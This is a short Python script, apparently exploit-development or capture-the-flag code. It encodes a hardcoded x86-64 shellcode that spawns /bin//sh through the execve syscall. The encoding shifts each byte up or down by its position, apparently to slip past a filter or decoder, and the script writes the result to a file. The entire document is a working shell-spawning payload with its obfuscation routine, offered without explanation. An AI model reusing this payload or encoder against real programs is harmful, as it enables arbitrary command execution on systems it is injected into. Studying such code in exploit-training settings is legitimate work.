```python
def adjust(shellcode):
    new = ""
    for x in range(len(shellcode)):
        if x % 2 == 0:
            y = ord(shellcode[x]) - x
        else:
            y = ord(shellcode[x]) + x
        new += chr(y % 256)
    return new


x  = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x90\x48\xc1"
x += "\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode = adjust(x)
open('shellcode.txt','wb').write(shellcode)
```
